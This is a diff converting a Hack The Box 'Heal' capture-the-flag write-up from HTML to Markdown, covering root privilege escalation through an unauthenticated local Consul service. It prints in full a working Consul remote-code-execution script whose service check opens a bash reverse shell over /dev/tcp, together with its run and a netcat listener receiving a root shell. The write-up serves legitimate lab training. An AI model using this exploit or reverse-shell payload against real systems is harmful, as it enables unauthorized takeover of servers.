-<p>I think that the ports running on localhost that I discovered earlier are very interesting, and now that I can do ssh tunneling.</p>
-<pre><code>ron@heal:~$ netstat -tulnp
+```
+
+I think that the ports running on localhost that I discovered earlier are very interesting, and now that I can do ssh tunneling.
+```
+ron@heal:~$ netstat -tulnp
 (Not all processes could be identified, non-owned process info
-    will not be shown, you would have to be root to see it all.)
+ will not be shown, you would have to be root to see it all.)
 Active Internet connections (only servers)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
 tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   
@@ -896,37 +895,53 @@ udp        0      0 0.0.0.0:33099           0.0.0.0:*                           
 udp        0      0 127.0.0.1:8600          0.0.0.0:*                           -                   
 udp6       0      0 :::5353                 :::*                                -                   
 udp6       0      0 :::52461                :::*                                -
-</code></pre>
-<p>I map all the ports on my local machine thanks to a quick python script I did for future occasion.</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/heal]
+```
+
+I map all the ports on my local machine thanks to a quick python script I did for future occasion.
+```
+┌──(oriol㉿zero)-[~/htb/heal]
 └─$ python3 generate_tunnels.py ron@heal.htb text.txt
 🔗 SSH Command:
 ssh -N -L 3000:localhost:3000 -L 3001:localhost:3001 -L 5432:localhost:5432 -L 8300:localhost:8300 -L 8301:localhost:8301 -L 8302:localhost:8302 -L 8500:localhost:8500 -L 8503:localhost:8503 -L 8600:localhost:8600 ron@heal.htb
 ron@heal.htb's password:
-</code></pre>
-<p>On the port 8500 I see that there is <strong>Consul v1.19.2</strong> running, I don't need password to access it.</p>
-<p>I see this CVE:
-https://www.exploit-db.com/exploits/51117</p>
-<p>Let's check if this process is being run with root privileges, if it is, it would be a very good way to escalate.</p>
-<pre><code>ron@heal:~$ ps -aux | grep consul
+```
+
+On the port 8500 I see that there is **Consul v1.19.2** running, I don't need password to access it.
+
+I see this CVE:
+https://www.exploit-db.com/exploits/51117
+
+Let's check if this process is being run with root privileges, if it is, it would be a very good way to escalate.
+```
+ron@heal:~$ ps -aux | grep consul
 root        1727  0.3  2.7 1359524 110504 ?      Ssl  04:03   2:48 /usr/local/bin/consul agent -server -ui -advertise=127.0.0.1 -bind=127.0.0.1 -data-dir=/var/lib/consul -node=consul-01 -config-dir=/etc/consul.d
-</code></pre>
-<p>Yes! Now we need to execute that CVE to get a root shell.</p>
-<p>I need the acl_token</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/heal]
+```
+
+Yes! Now we need to execute that CVE to get a root shell.
+
+I need the acl_token
+```
+┌──(oriol㉿zero)-[~/htb/heal]
 └─$ python3 exploit.py                                                  
 
-[-] Usage: python3 exploit.py &lt;rhost&gt; &lt;rport&gt; &lt;lhost&gt; &lt;lport&gt; &lt;acl_token&gt;
-</code></pre>
-<p>Looking at the script, seems that is on the headers:</p>
-<pre><code>headers = {&quot;X-Consul-Token&quot;: f&quot;{sys.argv[5]}&quot;}
-</code></pre>
-<p>https://developer.hashicorp.com/consul/docs/v1.19.x/security/acl/tokens</p>
-<p>Seems that there are no tokens...</p>
-<p><img src="src/heal12.png"/></p>
-<p>Maybe that's why I can access to it without login in(?)</p>
-<p>I will edit the python code so that id doesn't need to use a acl token.</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/heal]
+[-] Usage: python3 exploit.py <rhost> <rport> <lhost> <lport> <acl_token>
+```
+
+Looking at the script, seems that is on the headers:
+```
+headers = {"X-Consul-Token": f"{sys.argv[5]}"}
+```
+
+https://developer.hashicorp.com/consul/docs/v1.19.x/security/acl/tokens
+
+Seems that there are no tokens...
+![[heal12.png]]
+
+Maybe that's why I can access to it without login in(?)
+
+I will edit the python code so that id doesn't need to use a acl token.
+```
+┌──(oriol㉿zero)-[~/htb/heal]
 └─$ cat exploit.py     
 # Exploit Title: Hashicorp Consul v1.0 - Remote Command Execution (RCE)
 # Date: 26/10/2022
@@ -939,34 +954,44 @@ root        1727  0.3  2.7 1359524 110504 ?      Ssl  04:03   2:48 /usr/local/bi
 
 import requests, sys
 
-if len(sys.argv) &lt; 5:
-    print(f&quot;\n[\033[1;31m-\033[1;37m] Usage: python3 {sys.argv[0]} &lt;rhost&gt; &lt;rport&gt; &lt;lhost&gt; &lt;lport&gt;\n&quot;)
+if len(sys.argv) < 5:
+    print(f"\n[\033[1;31m-\033[1;37m] Usage: python3 {sys.argv[0]} <rhost> <rport> <lhost> <lport>\n")
     exit(1)
 
-target = f&quot;http://{sys.argv[1]}:{sys.argv[2]}/v1/agent/service/register&quot;
-json = {&quot;Address&quot;: &quot;127.0.0.1&quot;, &quot;check&quot;: {&quot;Args&quot;: [&quot;/bin/bash&quot;, &quot;-c&quot;, f&quot;bash -i &gt;&amp; /dev/tcp/{sys.argv[3]}/{sys.argv[4]} 0&gt;&amp;1&quot;], &quot;interval&quot;: &quot;10s&quot;, &quot;Timeout&quot;: &quot;864000s&quot;}, &quot;ID&quot;: &quot;gato&quot;, &quot;Name&quot;: &quot;gato&quot;, &quot;Port&quot;: 80}
+target = f"http://{sys.argv[1]}:{sys.argv[2]}/v1/agent/service/register"
+json = {"Address": "127.0.0.1", "check": {"Args": ["/bin/bash", "-c", f"bash -i >& /dev/tcp/{sys.argv[3]}/{sys.argv[4]} 0>&1"], "interval": "10s", "Timeout": "864000s"}, "ID": "gato", "Name": "gato", "Port": 80}
 
 try:
     requests.put(target, json=json)
-    print(&quot;\n[\033[1;32m+\033[1;37m] Request sent successfully, check your listener\n&quot;)
+    print("\n[\033[1;32m+\033[1;37m] Request sent successfully, check your listener\n")
 except:
-    print(&quot;\n[\033[1;31m-\033[1;37m] Something went wrong, check the connection and try again\n&quot;)                                                                                   
-</code></pre>
-<p>And it works!</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/heal]
+    print("\n[\033[1;31m-\033[1;37m] Something went wrong, check the connection and try again\n")                                                                                   
+```
+
+And it works!
+```
+┌──(oriol㉿zero)-[~/htb/heal]
 └─$ python3 exploit.py 127.0.0.1 8500 10.10.14.61 3010
 
 [+] Request sent successfully, check your listener
-</code></pre>
-<pre><code>┌──(oriol㉿zero)-[~/htb/heal]
+```
+
+```
+┌──(oriol㉿zero)-[~/htb/heal]
 └─$ nc -nvlp 3010
 listening on [any] 3010 ...
 connect to [10.10.14.61] from (UNKNOWN) [10.10.11.46] 38074
 bash: cannot set terminal process group (93200): Inappropriate ioctl for device
 bash: no job control in this shell
 root@heal:/# 
-</code></pre>
-<p>What it seems to do this exploit is to create a new service named "gato". That service executes the reverse shell.</p>
-    </div>
-</body>
-</html>
+```
+
+What it seems to do this exploit is to create a new service named "gato". That service executes the reverse shell.
+
+
+
+
+
+
+
+
